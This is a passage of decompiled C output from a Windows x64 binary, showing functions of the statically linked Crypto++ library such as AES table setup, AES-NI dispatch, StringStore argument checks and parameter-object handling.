      v29 = *v54 == v57;
      *v54 -= v57;
      v59 = *((_QWORD *)v49 + 3);
      if ( v29 || v58 == (char *)(v59 + *((_QWORD *)v49 + 2)) )
        *((_QWORD *)v49 + 7) = v59;
      sub_13F15EB00(v51, v53, v57);
      sub_13F15EB00((__m128i *)((char *)v51 + v57), *((const __m128i **)v49 + 7), *v54);
      *v54 = 0i64;
    }
    (*(void (__fastcall **)(_DWORD *, __m128i *, __int64))(*(_QWORD *)a1 + 464i64))(a1, v51, v50);
    *((_BYTE *)a1 + 72) = 0;
    v60 = *((_QWORD *)a1 + 6);
    sub_13F1051C0((_QWORD *)a1 + 10, v60);
    *((_QWORD *)a1 + 14) = 1i64;
    *((_QWORD *)a1 + 15) = v60;
    *((_QWORD *)a1 + 16) = 0i64;
    *((_QWORD *)a1 + 17) = *((_QWORD *)a1 + 13);
    v61 = (*(__int64 (__fastcall **)(_DWORD *))(*(_QWORD *)a1 + 336i64))(a1);
    LOBYTE(v10) = (*(__int64 (__fastcall **)(__int64, __int64 *, _QWORD, _QWORD, int, char))(*(_QWORD *)v61 + 280i64))(
                    v61,
                    &qword_13F1B7008,
                    0i64,
                    0i64,
                    a4 - 1,
                    v9) != 0;
    a1[10] = v10;
    if ( v51 )
    {
      memset(v51, 0, v50);
      sub_13F12E550(v51);
    }
  }
  return 0i64;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F1B7008: using guessed type __int64 qword_13F1B7008;

//----- (000000013F12A7A0) ----------------------------------------------------
__int64 __fastcall sub_13F12A7A0(__int64 a1, __int64 a2, __int64 a3, unsigned int a4, char a5)
{
  __int64 v9; // rax
  __int64 v10; // r9

  v9 = (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 24) + 336i64))(*(_QWORD *)(a1 + 24));
  v10 = 0i64;
  if ( *(_BYTE *)(a1 + 32) )
    v10 = a4;
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64, __int64))(*(_QWORD *)v9 + 56i64))(v9, a2, a3, v10);
}

//----- (000000013F12A810) ----------------------------------------------------
__int64 __fastcall sub_13F12A810(_QWORD *a1, __int64 a2, __int64 a3)
{
  __int64 result; // rax

  sub_13F1051C0(a1, a3 * a2);
  result = a1[3];
  a1[4] = a2;
  a1[7] = result;
  a1[5] = a3;
  a1[6] = 0i64;
  return result;
}

//----- (000000013F12A860) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F12A860(_QWORD *a1, __int64 a2)
{
  __int64 v3; // rax
  void *v4; // rdx
  bool v5; // zf
  unsigned __int64 result; // rax
  unsigned __int64 v7; // r8
  char v8[8]; // [rsp+20h] [rbp-B8h] BYREF
  __int64 v9; // [rsp+28h] [rbp-B0h]
  unsigned __int64 v10; // [rsp+30h] [rbp-A8h]
  unsigned __int64 v11; // [rsp+40h] [rbp-98h]
  unsigned __int64 v12; // [rsp+48h] [rbp-90h]
  void *v13; // [rsp+50h] [rbp-88h]
  __int64 v14; // [rsp+58h] [rbp-80h]
  __m128i v15[2]; // [rsp+60h] [rbp-78h] BYREF
  char pExceptionObject[64]; // [rsp+80h] [rbp-58h] BYREF

  v14 = -2i64;
  v11 = -1i64;
  v12 = 0i64;
  v13 = 0i64;
  v9 = 0i64;
  v10 = 0i64;
  v8[0] = 0;
  if ( !(*(unsigned __int8 (__fastcall **)(__int64, const char *, void *, char *))(*(_QWORD *)a2 + 8i64))(
          a2,
          "InputBuffer",
          &CryptoPP::ConstByteArrayParameter `RTTI Type Descriptor',
          v8) )
  {
    sub_13F1053B0(v15, (const __m128i *)"StringStore: missing InputBuffer argument");
    sub_13F101600((__int64)pExceptionObject, v15);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  v3 = v9;
  v4 = v13;
  v5 = v8[0] == 0;
  if ( v8[0] )
    v3 = (__int64)v13;
  a1[5] = v3;
  result = v10;
  v7 = v12;
  if ( !v5 )
    result = v12;
  a1[6] = result;
  a1[7] = 0i64;
  if ( v11 < v7 )
    v7 = v11;
  if ( v4 )
  {
    memset(v4, 0, v7);
    return sub_13F12E550(v4);
  }
  return result;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F12A860: using guessed type char var_B8[8];
// 13F12A860: using guessed type __m128i var_78[2];

//----- (000000013F12A990) ----------------------------------------------------
__int64 __fastcall sub_13F12A990(__int64 a1, __int64 a2, __int64 a3, __int64 a4, char a5)
{
  __int64 v8; // rax

  v8 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 336i64))(a1);
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64, __int64))(*(_QWORD *)v8 + 256i64))(v8, a2, a3, a4);
}

//----- (000000013F12A9E0) ----------------------------------------------------
__int64 __fastcall sub_13F12A9E0(__int64 *a1, __int64 a2, __int64 *a3, __int64 a4, char a5)
{
  __int64 v6; // r10
  __int64 v8; // r9
  __int64 result; // rax
  __int64 v10; // rdx
  char v12; // [rsp+28h] [rbp-10h]
  __int64 v13; // [rsp+40h] [rbp+8h] BYREF

  v6 = *a1;
  v12 = a5;
  v8 = *a3;
  v13 = 0i64;
  result = (*(__int64 (__fastcall **)(__int64 *, __int64, __int64 *, __int64, __int64, char))(v6 + 264))(
             a1,
             a2,
             &v13,
             v8,
             a4,
             v12);
  v10 = v13;
  a1[7] += v13;
  *a3 = v10;
  return result;
}

//----- (000000013F12AA30) ----------------------------------------------------
__int64 __fastcall sub_13F12AA30(__int64 a1, __int64 a2)
{
  __int64 v3; // rdi
  void (__fastcall ***v4)(_QWORD, __int64); // rcx

  *(_QWORD *)a1 = &CryptoPP::AlgorithmParameters::`vftable';
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_BYTE *)(a1 + 16) = *(_BYTE *)(a2 + 16);
  v3 = *(_QWORD *)(a2 + 8);
  *(_QWORD *)(a2 + 8) = 0i64;
  v4 = *(void (__fastcall ****)(_QWORD, __int64))(a1 + 8);
  if ( v4 )
    (**v4)(v4, 1i64);
  *(_QWORD *)(a1 + 8) = v3;
  return a1;
}
// 13F187520: using guessed type void *CryptoPP::AlgorithmParameters::`vftable';

//----- (000000013F12AA90) ----------------------------------------------------
__int64 __fastcall sub_13F12AA90(__int64 a1)
{
  __int64 result; // rax

  *(_QWORD *)a1 = &CryptoPP::AlgorithmParameters::`vftable';
  result = a1;
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_BYTE *)(a1 + 16) = 1;
  return result;
}
// 13F187520: using guessed type void *CryptoPP::AlgorithmParameters::`vftable';

//----- (000000013F12AAB0) ----------------------------------------------------
_QWORD *__fastcall sub_13F12AAB0(_QWORD *a1, char a2)
{
  void (__fastcall ***v4)(_QWORD, __int64); // rcx

  v4 = (void (__fastcall ***)(_QWORD, __int64))a1[1];
  if ( v4 )
    (**v4)(v4, 1i64);
  *a1 = &CryptoPP::NameValuePairs::`vftable';
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 24i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F182E30: using guessed type void *CryptoPP::NameValuePairs::`vftable';

//----- (000000013F12AB10) ----------------------------------------------------
char __fastcall sub_13F12AB10(__int64 a1, __m128i *a2, __int64 a3, __m128i *a4)
{
  __int64 v4; // rcx

  v4 = *(_QWORD *)(a1 + 8);
  if ( v4 )
    return sub_13F12AB20(v4, a2, a3, a4);
  else
    return 0;
}

//----- (000000013F12AB20) ----------------------------------------------------
char __fastcall sub_13F12AB20(__int64 a1, __m128i *a2, __int64 a3, __m128i *a4)
{
  __int64 v9; // rcx
  const __m128i *v10; // rdx
  unsigned __int64 v11; // r8
  __m128i *v12; // rax
  unsigned __int64 v13; // r8
  __int64 v14; // rdx
  __int8 *v15; // rbx

  if ( (unsigned int)sub_13F16A230((unsigned __int8 *)a2, (__int64)"ValueNames") )
  {
    while ( strcmp(a2->m128i_i8, *(const char **)(a1 + 8)) )
    {
      a1 = *(_QWORD *)(a1 + 24);
      if ( !a1 )
        return 0;
    }
    (*(void (__fastcall **)(__int64, __m128i *, __int64, __m128i *))(*(_QWORD *)a1 + 8i64))(a1, a2, a3, a4);
    *(_BYTE *)(a1 + 17) = 1;
  }
  else
  {
    sub_13F101D10(a2, (__int64)&std::string `RTTI Type Descriptor', a3);
    v9 = *(_QWORD *)(a1 + 24);
    if ( v9 )
      sub_13F12AB20(v9, a2, a3, a4);
    v10 = *(const __m128i **)(a1 + 8);
    v11 = -1i64;
    do
      ++v11;
    while ( v10->m128i_i8[v11] );
    v12 = sub_13F106DB0(a4, v10, v11);
    v13 = v12[1].m128i_u64[1];
    v14 = v12[1].m128i_i64[0];
    if ( v13 == v14 )
    {
      sub_13F107AD0(v12, 1ui64, 0i64, (const __m128i *)&qword_13F186BF0, 1ui64);
    }
    else
    {
      v12[1].m128i_i64[0] = v14 + 1;
      if ( v13 >= 0x10 )
        v12 = (__m128i *)v12->m128i_i64[0];
      v15 = &v12->m128i_i8[v14];
      sub_13F15EB00((__m128i *)((char *)v12 + v14), (const __m128i *)&qword_13F186BF0, 1ui64);
      v15[1] = 0;
    }
  }
  return 1;
}
// 13F186BF0: using guessed type __int64 qword_13F186BF0;
// 13F1BF6A0: using guessed type void **std::string `RTTI Type Descriptor';

//----- (000000013F12AC70) ----------------------------------------------------
char __fastcall sub_13F12AC70(__int64 a1, unsigned __int8 *a2, __int64 a3, __int64 a4)
{
  __int64 v4; // r14
  unsigned __int8 (__fastcall *v9)(__int64, unsigned __int8 *, __int64, __int64); // r15

  v4 = *(_QWORD *)(a1 + 8);
  v9 = *(unsigned __int8 (__fastcall **)(__int64, unsigned __int8 *, __int64, __int64))(*(_QWORD *)v4 + 8i64);
  if ( (unsigned int)sub_13F16A230(a2, (__int64)"ValueNames") )
  {
    if ( v9(v4, a2, a3, a4)
      || (*(unsigned __int8 (__fastcall **)(_QWORD, unsigned __int8 *, __int64, __int64))(**(_QWORD **)(a1 + 16) + 8i64))(
           *(_QWORD *)(a1 + 16),
           a2,
           a3,
           a4) )
    {
      return 1;
    }
  }
  else if ( v9(v4, a2, a3, a4)
         && (*(unsigned __int8 (__fastcall **)(_QWORD, unsigned __int8 *, __int64, __int64))(**(_QWORD **)(a1 + 16)
                                                                                           + 8i64))(
              *(_QWORD *)(a1 + 16),
              a2,
              a3,
              a4) )
  {
    return 1;
  }
  return 0;
}

//----- (000000013F12AD1C) ----------------------------------------------------
unsigned int **__fastcall sub_13F12AD1C(unsigned int **a1, _DWORD *a2)
{
  unsigned int v3; // [rsp+20h] [rbp-28h]
  int v4; // [rsp+24h] [rbp-24h]
  int v5; // [rsp+28h] [rbp-20h]
  unsigned int *v6; // [rsp+30h] [rbp-18h]

  v6 = *a1;
  v5 = sub_13F1024C0();
  v3 = 0;
  if ( v6 )
    v3 = *v6;
  if ( sub_13F12BDB0(v5) )
    v4 = v3;
  else
    v4 = sub_13F12BA00(v3);
  *a2 = v4;
  ++*a1;
  return a1;
}

//----- (000000013F12ADAC) ----------------------------------------------------
_DWORD **__fastcall sub_13F12ADAC(_DWORD **a1, unsigned int a2)
{
  int v3; // [rsp+20h] [rbp-38h]
  int v4; // [rsp+24h] [rbp-34h]
  int v5; // [rsp+28h] [rbp-30h]
  _DWORD *v6; // [rsp+38h] [rbp-20h]
  int *v7; // [rsp+40h] [rbp-18h]

  v6 = *a1;
  v7 = a1[1];
  v5 = sub_13F1024C0();
  if ( sub_13F12BDB0(v5) )
    v4 = a2;
  else
    v4 = sub_13F12BA00(a2);
  v3 = v4;
  if ( v6 )
    v3 = *v6 ^ v4;
  if ( v7 )
    *v7 = v3;
  ++a1[1];
  if ( *a1 )
    ++*a1;
  return a1;
}

//----- (000000013F12AE84) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F12AE84(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 result; // rax
  unsigned __int64 i; // [rsp+20h] [rbp-18h]
  unsigned __int64 v5; // [rsp+28h] [rbp-10h]

  v5 = a3 / 4;
  for ( i = 0i64; ; ++i )
  {
    result = v5;
    if ( i >= v5 )
      break;
    *(_DWORD *)(a1 + 4 * i) = sub_13F12BA00(*(_DWORD *)(a2 + 4 * i));
  }
  return result;
}

//----- (000000013F12AEF8) ----------------------------------------------------
__m128i *__fastcall sub_13F12AEF8(int a1, __m128i *a2, __int64 a3, const __m128i *a4, unsigned __int64 a5)
{
  __int64 v6; // [rsp+20h] [rbp-18h]
  __int64 v7; // [rsp+28h] [rbp-10h] BYREF

  v7 = 4i64;
  sub_13F10D330(a2, 4 * a3, a4, a5);
  sub_13F12E430((__int64)a2->m128i_i64 + a5, 0, 4 * a3 - a5);
  v6 = sub_13F12B098(&a5, &v7);
  if ( sub_13F12BDB0(a1) )
    return a2;
  else
    return (__m128i *)sub_13F12AE84((__int64)a2, (__int64)a2, v6);
}

//----- (000000013F12AFC4) ----------------------------------------------------
__int64 __fastcall sub_13F12AFC4(_QWORD *a1, _QWORD *a2)
{
  __int64 v4; // [rsp+8h] [rbp-10h]

  if ( !*a2 || ((*a2 - 1i64) & *a2) != 0 )
    return *a1 - *a1 % *a2;
  if ( *a2 <= 1ui64 )
    v4 = 0i64;
  else
    v4 = *a2 - 1i64;
  return *a1 - (v4 & *a1);
}

//----- (000000013F12B098) ----------------------------------------------------
__int64 __fastcall sub_13F12B098(_QWORD *a1, _QWORD *a2)
{
  __int64 v3[2]; // [rsp+28h] [rbp-90h] BYREF
  __m128i v4[2]; // [rsp+38h] [rbp-80h] BYREF
  char pExceptionObject[64]; // [rsp+60h] [rbp-58h] BYREF

  v3[1] = -2i64;
  if ( (unsigned __int64)(sub_13F12E420() - *a2 + 1) < *a1 )
  {
    sub_13F1053B0(v4, (const __m128i *)"RoundUpToMultipleOf: integer overflow");
    sub_13F101600((__int64)pExceptionObject, v4);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  v3[0] = *a1 + *a2 - 1i64;
  return sub_13F12AFC4(v3, a2);
}
// 13F12B098: using guessed type __m128i var_80[2];

//----- (000000013F12B17C) ----------------------------------------------------
__m128i *sub_13F12B17C(__int64 a1, __m128i *a2, ...)
{
  __m128i *v3; // [rsp+20h] [rbp-58h]
  unsigned __int64 v4; // [rsp+28h] [rbp-50h]
  unsigned __int64 v5; // [rsp+30h] [rbp-48h]
  va_list v7; // [rsp+40h] [rbp-38h]
  unsigned __int64 v9; // [rsp+90h] [rbp+18h] BYREF
  va_list va; // [rsp+90h] [rbp+18h]
  unsigned __int64 v11; // [rsp+98h] [rbp+20h] BYREF
  va_list va1; // [rsp+98h] [rbp+20h]
  __int64 v13; // [rsp+A0h] [rbp+28h]
  va_list va2; // [rsp+A8h] [rbp+30h] BYREF

  va_start(va2, a2);
  va_start(va1, a2);
  va_start(va, a2);
  v9 = va_arg(va1, _QWORD);
  va_copy(va2, va1);
  v11 = va_arg(va2, _QWORD);
  v13 = va_arg(va2, _QWORD);
  if ( v9 == v11 )
    return a2;
  if ( (_BYTE)v13 )
  {
    v4 = v11;
    sub_13F1073C0(v11);
    if ( v4 )
      v3 = (__m128i *)sub_13F12E450(4 * v4);
    else
      v3 = 0i64;
    if ( v11 >= v9 )
      va_copy(v7, va);
    else
      va_copy(v7, va1);
    if ( a2 && v3 )
      sub_13F10D330(v3, 4i64 * *(_QWORD *)v7, a2, 4i64 * *(_QWORD *)v7);
    if ( a2 )
    {
      sub_13F107960(a2, v9);
      sub_13F12E4D0((__int64)a2);
    }
    return v3;
  }
  else
  {
    if ( a2 )
    {
      sub_13F107960(a2, v9);
      sub_13F12E4D0((__int64)a2);
    }
    v5 = v11;
    sub_13F1073C0(v11);
    if ( v5 )
      return (__m128i *)sub_13F12E450(4 * v5);
    else
      return 0i64;
  }
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);

//----- (000000013F12B3C4) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F12B3C4(
        __int64 a1,
        __m128i *a2,
        const __m128i *a3,
        __m128i *a4,
        unsigned __int64 a5,
        char a6)
{
  __m128i *i; // [rsp+48h] [rbp-70h]
  __int64 v8; // [rsp+50h] [rbp-68h]
  int v9; // [rsp+58h] [rbp-60h]
  const __m128i *v10; // [rsp+68h] [rbp-50h]
  const __m128i *v11; // [rsp+70h] [rbp-48h]
  __int64 v12; // [rsp+78h] [rbp-40h]
  __int64 v13; // [rsp+80h] [rbp-38h]
  __int64 v14; // [rsp+88h] [rbp-30h]
  __int64 v15; // [rsp+90h] [rbp-28h]

  if ( (unsigned __int8)sub_13F12BD50() )
    return sub_13F13F6A0(*(_QWORD *)(a1 + 48), *(_DWORD *)(a1 + 16), a2, a3, a4, a5, a6);
  if ( !(unsigned __int8)sub_13F12BD70() )
    return sub_13F10F800(a1, a2, (unsigned __int64)a3, (unsigned __int64)a4, a5, a6);
  if ( a5 < 0x10 )
    return a5;
  *(_QWORD *)(a1 + 64) = *(_QWORD *)(a1 + 72);
  for ( i = (__m128i *)((256 - *(_QWORD *)(a1 + 80) % 0x100ui64) % 0x100 + *(_QWORD *)(a1 + 80));
        sub_13F12B8E0((unsigned __int64)i, (unsigned __int64)&i[19].m128i_u64[1]);
        i += 16 )
  {
    ;
  }
  v8 = 16i64;
  if ( (a6 & 8) != 0 )
  {
    a2 = (__m128i *)((char *)a2 + a5 - 16);
    a3 = (const __m128i *)((char *)a3 + a5 - 16);
    a4 = (__m128i *)((char *)a4 + a5 - 16);
    v8 = -16i64;
  }
  i[14].m128i_i64[0] = (__int64)a2;
  if ( (a6 & 4) != 0 && a3 )
    v10 = a3;
  else
    v10 = (const __m128i *)qword_13F1C4DD0;
  i[14].m128i_i64[1] = (__int64)v10;
  if ( (a6 & 4) != 0 || !a3 )
    v11 = (const __m128i *)qword_13F1C4DD0;
  else
    v11 = a3;
  i[15].m128i_i64[0] = (__int64)v11;
  i[15].m128i_i64[1] = (__int64)a4;
  if ( (a6 & 2) != 0 )
    v12 = 0i64;
  else
    v12 = v8;
  i[16].m128i_i64[0] = v12;
  if ( (a6 & 4) != 0 && a3 )
    v13 = v8;
  else
    v13 = 0i64;
  i[16].m128i_i64[1] = v13;
  if ( (a6 & 4) != 0 || !a3 )
    v14 = 0i64;
  else
    v14 = v8;
  i[17].m128i_i64[0] = v14;
  if ( (a6 & 2) != 0 )
    v15 = 0i64;
  else
    v15 = v8;
  i[17].m128i_i64[1] = v15;
  i[18].m128i_i64[1] = a5 - a5 % 0x10 - (a6 & 1);
  if ( (a6 & 1) != 0 )
    v9 = 3;
  else
    v9 = 2;
  i[19].m128i_i64[0] = 16 * (12 - (*(_DWORD *)(a1 + 16) - v9));
  sub_13F13A570(i, *(const __m128i **)(a1 + 48));
  return a5 % 0x10;
}
// 13F1C4DD0: using guessed type __int64 qword_13F1C4DD0[2];

//----- (000000013F12B874) ----------------------------------------------------
__m128i *__fastcall sub_13F12B874(__int64 a1, __m128i *a2)
{
  if ( (unsigned __int8)sub_13F12BD50() )
    sub_13F1053B0(a2, (const __m128i *)"AESNI");
  else
    sub_13F1053B0(a2, (const __m128i *)"C++");
  return a2;
}

//----- (000000013F12B8E0) ----------------------------------------------------
bool __fastcall sub_13F12B8E0(unsigned __int64 a1, unsigned __int64 a2)
{
  signed __int64 v5; // [rsp+8h] [rbp-30h]
  signed __int64 v6; // [rsp+10h] [rbp-28h]
  signed __int64 v7; // [rsp+18h] [rbp-20h]
  signed __int64 v8; // [rsp+20h] [rbp-18h]

  v7 = a1 % 0x1000;
  v8 = a2 % 0x1000;
  v6 = (unsigned __int64)qword_13F1C45D0 % 0x1000;
  v5 = (unsigned __int64)&qword_13F1C45D0[258] % 0x1000;
  if ( v5 <= (__int64)((unsigned __int64)qword_13F1C45D0 % 0x1000) )
    return v7 < v5 || v8 <= v5 || v7 >= v6 || v8 > v6;
  else
    return v7 >= v6 && v7 < v5 || v8 > v6 && v8 <= v5;
}
// 13F1C45D0: using guessed type __int64 qword_13F1C45D0[256];

//----- (000000013F12BA00) ----------------------------------------------------
__int64 __fastcall sub_13F12BA00(unsigned int a1)
{
  return _byteswap_ulong(a1);
}

//----- (000000013F12BA08) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F12BA08()
{
  __int64 result; // rax
  int v1; // er8
  unsigned __int64 v2; // rax
  unsigned __int8 v3; // [rsp+0h] [rbp-18h]
  int i; // [rsp+4h] [rbp-14h]

  for ( i = 0; i < 256; ++i )
  {
    v3 = *((_BYTE *)qword_13F189370 + i);
    v1 = 283 * (((int)v3 >> 7) & 1);
    v2 = (unsigned __int64)(v3 ^ v1 ^ (2 * v3) ^ (283 * (((int)v3 >> 5) & 4)) ^ (283 * (((int)v3 >> 5) & 2)) ^ (283 * (((int)v3 >> 5) & 1)) ^ (8 * v3) | ((v1 ^ (2 * v3) ^ (283 * (((int)v3 >> 6) & 2)) ^ (283 * (((int)v3 >> 6) & 1)) ^ (4 * v3) ^ (283 * (((int)v3 >> 5) & 4)) ^ (283 * (((int)v3 >> 5) & 2)) ^ (283 * (((int)v3 >> 5) & 1)) ^ (8 * v3)) << 24) | ((v3 ^ (283 * (((int)v3 >> 5) & 4)) ^ (283 * (((int)v3 >> 5) & 2)) ^ (283 * (((int)v3 >> 5) & 1)) ^ (8 * v3)) << 16) | ((v3 ^ (283 * (((int)v3 >> 6) & 2)) ^ (283 * (((int)v3 >> 6) & 1)) ^ (4 * v3) ^ (283 * (((int)v3 >> 5) & 4)) ^ (283 * (((int)v3 >> 5) & 2)) ^ (283 * (((int)v3 >> 5) & 1)) ^ (8 * (unsigned int)v3)) << 8)) << 32;
    qword_13F1C4DE0[i] = v3 | ((v1 ^ (2 * v3) ^ (283 * (((int)v3 >> 6) & 2)) ^ (283 * (((int)v3 >> 6) & 1)) ^ (4 * v3) ^ (283 * (((int)v3 >> 5) & 4)) ^ (283 * (((int)v3 >> 5) & 2)) ^ (283 * (((int)v3 >> 5) & 1)) ^ (8 * v3)) << 24) | ((v3 ^ (283 * (((int)v3 >> 5) & 4)) ^ (283 * (((int)v3 >> 5) & 2)) ^ (283 * (((int)v3 >> 5) & 1)) ^ (8 * v3)) << 16) | ((v3 ^ (283 * (((int)v3 >> 6) & 2)) ^ (283 * (((int)v3 >> 6) & 1)) ^ (4 * v3) ^ (283 * (((int)v3 >> 5) & 4)) ^ (283 * (((int)v3 >> 5) & 2)) ^ (283 * (((int)v3 >> 5) & 1)) ^ (8 * (unsigned int)v3)) << 8) | v2;
    result = (unsigned int)(i + 1);
  }
  byte_13F1C55E1 = 1;
  return result;
}
// 13F12BC25: write access to const memory at 13F1C55E1 has been detected
// 13F189370: using guessed type __int64 qword_13F189370[32];
// 13F1C4DE0: using guessed type __int64 qword_13F1C4DE0[256];
// 13F1C55E1: using guessed type char byte_13F1C55E1;

//----- (000000013F12BC34) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F12BC34()
{
  __int64 result; // rax
  unsigned __int8 v1; // [rsp+0h] [rbp-18h]
  int i; // [rsp+4h] [rbp-14h]

  for ( i = 0; i < 256; ++i )
  {
    v1 = *((_BYTE *)qword_13F189270 + i);
    qword_13F1C45D0[i] = (((283 * (((int)v1 >> 7) & 1)) ^ (2 * v1)) << 24) | (v1 << 16) | (v1 << 8) | ((unsigned __int64)(v1 ^ (283 * (((int)v1 >> 7) & 1)) ^ (2 * v1) | (((283 * (((int)v1 >> 7) & 1)) ^ (2 * v1)) << 24) | (v1 << 16) | (v1 << 8)) << 32);
  }
  qword_13F1C45D0[257] = 0i64;
  result = 2048i64;
  qword_13F1C45D0[256] = 0i64;
  byte_13F1C55E0 = 1;
  return result;
}
// 13F12BD1B: write access to const memory at 13F1C55E0 has been detected
// 13F189270: using guessed type __int64 qword_13F189270[32];
// 13F1C45D0: using guessed type __int64 qword_13F1C45D0[256];
// 13F1C55E0: using guessed type char byte_13F1C55E0;

//----- (000000013F12BD30) ----------------------------------------------------
__int64 sub_13F12BD30()
{
  return 64i64;
}
// 13F1B7070: using guessed type int dword_13F1B7070;
// 13F1C56B0: using guessed type char byte_13F1C56B0;

//----- (000000013F12BD50) ----------------------------------------------------
__int64 sub_13F12BD50()
{
  return 1i64;
}
// 13F1C56B0: using guessed type char byte_13F1C56B0;
// 13F1C56B6: using guessed type char byte_13F1C56B6;

//----- (000000013F12BD70) ----------------------------------------------------
__int64 sub_13F12BD70()
{
  return 1i64;
}
// 13F1C56B0: using guessed type char byte_13F1C56B0;
// 13F1C56B1: using guessed type char byte_13F1C56B1;

//----- (000000013F12BD90) ----------------------------------------------------
__int64 sub_13F12BD90()
{
  return 1i64;
}
// 13F1C56B0: using guessed type char byte_13F1C56B0;
// 13F1C56B3: using guessed type char byte_13F1C56B3;

//----- (000000013F12BDB0) ----------------------------------------------------
bool __fastcall sub_13F12BDB0(int a1)
{
  return a1 == 0;
}

//----- (000000013F12BDB8) ----------------------------------------------------
__int64 __fastcall sub_13F12BDB8(__int64 a1, __int64 a2)
{
  __int64 result; // rax
  char v3; // [rsp+20h] [rbp-28h]

  v3 = 0;
  *(_QWORD *)(a1 + 24) = sub_13F12B17C(a1, *(__m128i **)(a1 + 24), *(_QWORD *)(a1 + 16), a2, v3);
  *(_QWORD *)(a1 + 16) = a2;
  result = a1;
  *(_QWORD *)(a1 + 8) = 0x3FFFFFFFFFFFFFFFi64;
  return result;
}

//----- (000000013F12BE34) ----------------------------------------------------
__int64 __fastcall sub_13F12BE34()
{
  if ( (unsigned __int8)sub_13F12BD50() )
    return 16i64;
  else
    return sub_13F1043C0();
}

//----- (000000013F12BE64) ----------------------------------------------------
_DWORD **__fastcall sub_13F12BE64(__int64 a1, __m128i *a2, const __m128i *a3, __m128i *a4)
{
  unsigned int **v5; // rax
  unsigned int **v6; // rax
  unsigned int **v7; // rax
  _DWORD **v8; // rax
  _DWORD **v9; // rax
  _DWORD **v10; // rax
  unsigned int v11; // [rsp+30h] [rbp-98h]
  int v12; // [rsp+30h] [rbp-98h]
  int v13; // [rsp+30h] [rbp-98h]
  int v14; // [rsp+30h] [rbp-98h]
  unsigned int v15; // [rsp+30h] [rbp-98h]
  unsigned int v16; // [rsp+30h] [rbp-98h]
  unsigned int v17; // [rsp+30h] [rbp-98h]
  int v18; // [rsp+30h] [rbp-98h]
  int v19; // [rsp+30h] [rbp-98h]
  unsigned int v20; // [rsp+30h] [rbp-98h]
  unsigned int v21; // [rsp+34h] [rbp-94h]
  int v22; // [rsp+34h] [rbp-94h]
  int v23; // [rsp+34h] [rbp-94h]
  int v24; // [rsp+34h] [rbp-94h]
  unsigned int v25; // [rsp+34h] [rbp-94h]
  unsigned int v26; // [rsp+34h] [rbp-94h]
  unsigned int v27; // [rsp+34h] [rbp-94h]
  int v28; // [rsp+34h] [rbp-94h]
  int v29; // [rsp+34h] [rbp-94h]
  unsigned int v30; // [rsp+34h] [rbp-94h]
  unsigned int v31; // [rsp+38h] [rbp-90h]
  int v32; // [rsp+38h] [rbp-90h]
  int v33; // [rsp+38h] [rbp-90h]
  int v34; // [rsp+38h] [rbp-90h]
  unsigned int v35; // [rsp+38h] [rbp-90h]
  unsigned int v36; // [rsp+38h] [rbp-90h]
  int v37; // [rsp+38h] [rbp-90h]
  int v38; // [rsp+38h] [rbp-90h]
  int v39; // [rsp+38h] [rbp-90h]
  unsigned int v40; // [rsp+38h] [rbp-90h]
  unsigned int v41; // [rsp+3Ch] [rbp-8Ch]
  int v42; // [rsp+3Ch] [rbp-8Ch]
  int v43; // [rsp+3Ch] [rbp-8Ch]
  int v44; // [rsp+3Ch] [rbp-8Ch]
  unsigned int v45; // [rsp+3Ch] [rbp-8Ch]
  unsigned int v46; // [rsp+3Ch] [rbp-8Ch]
  unsigned int v47; // [rsp+3Ch] [rbp-8Ch]
  int v48; // [rsp+3Ch] [rbp-8Ch]
  int v49; // [rsp+3Ch] [rbp-8Ch]
  unsigned int v50; // [rsp+3Ch] [rbp-8Ch]
  unsigned int v51; // [rsp+40h] [rbp-88h] BYREF
  unsigned int v52; // [rsp+44h] [rbp-84h] BYREF
  unsigned int v53; // [rsp+48h] [rbp-80h] BYREF
  unsigned int v54; // [rsp+4Ch] [rbp-7Ch] BYREF
  unsigned int *v55; // [rsp+50h] [rbp-78h]
  int v56; // [rsp+58h] [rbp-70h]
  unsigned int *v57; // [rsp+60h] [rbp-68h]
  unsigned int i; // [rsp+68h] [rbp-60h]
  unsigned int v59; // [rsp+6Ch] [rbp-5Ch]
  int v60; // [rsp+70h] [rbp-58h]
  int v61; // [rsp+74h] [rbp-54h]
  int v62; // [rsp+78h] [rbp-50h]
  int v63; // [rsp+7Ch] [rbp-4Ch]
  int v64; // [rsp+80h] [rbp-48h]
  __m128i *v65; // [rsp+88h] [rbp-40h] BYREF
  _DWORD *v66[2]; // [rsp+90h] [rbp-38h] BYREF
  unsigned int v67; // [rsp+A0h] [rbp-28h] BYREF
  int v68; // [rsp+A4h] [rbp-24h]
  int v69; // [rsp+A8h] [rbp-20h]
  int v70; // [rsp+ACh] [rbp-1Ch]

  if ( (unsigned __int8)sub_13F12BD70() )
    return (_DWORD **)sub_13F12B3C4(a1, a2, a3, a4, 0x10ui64, 0);
  v65 = a2;
  v5 = sub_13F12AD1C((unsigned int **)&v65, &v54);
  v6 = sub_13F12AD1C(v5, &v53);
  v7 = sub_13F12AD1C(v6, &v52);
  sub_13F12AD1C(v7, &v51);
  v55 = *(unsigned int **)(a1 + 48);
  v54 ^= *v55;
  v53 ^= v55[1];
  v52 ^= v55[2];
  v51 ^= v55[3];
  v31 = v55[4];
  v21 = v55[5];
  v11 = v55[6];
